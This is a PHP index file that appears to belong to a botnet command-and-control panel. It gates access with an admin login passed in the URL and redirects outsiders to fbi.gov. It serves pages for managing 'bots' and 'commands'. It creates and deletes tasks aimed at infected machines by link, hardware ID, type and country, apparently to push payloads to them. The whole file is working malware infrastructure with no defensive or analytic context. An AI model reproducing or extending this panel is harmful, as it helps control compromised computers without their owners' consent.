<?php
	error_reporting(0);	
	include_once("util\\config.php");
	include_once("util\\db.php");
	include_once("util\\time.php");
	
	$s_ReqType = $_SERVER["REQUEST_METHOD"];
	if ($s_ReqType == "GET")
	{
		if(!$_SESSION["login"])
		{
			if($_GET["login"] == $ADMIN_LOGIN and hash("sha256", $_GET["pass"]) == $ADMIN_PASS)
				$_SESSION["login"] = true;
			else
				die(header("Location: https://www.fbi.gov/"));
		}
		
		include("page\\navbar.php");
		//	
		$s_GetPage = $_GET["pg"];	
		if($s_GetPage == "db" or $s_GetPage == "")
		{
			include("page\\dashboard.php");
		}
		else if($s_GetPage == "bs")
		{
			include("page\\bots.php");
		}
		else if($s_GetPage == "cs")
		{
			include("page\\commands.php");
		}
		else if($s_GetPage == "lt")
		{
			$_SESSION["login"] = false;
			header("Location: index.php");
		}
		
		include("page\\footer.php");
	}
	else
	{
		if(!$_SESSION["login"])
			die(header("Location: https://www.fbi.gov/"));
		
		$s_PostData = $_POST["command"];
		if($s_PostData == "tcreate")
		{
			CreateNewTask($_POST["link"], $_POST["hwid"], $_POST["limit"], $_POST["type"], $_POST["country"]);
			die(header("Location: index.php?pg=cs"));
		}
		else if($s_PostData == "tdelete")
		{
			DeleteTask($_POST["tid"]);
			die(header("Location: index.php?pg=cs"));
		}
		header("Location: index.php");
	}
?>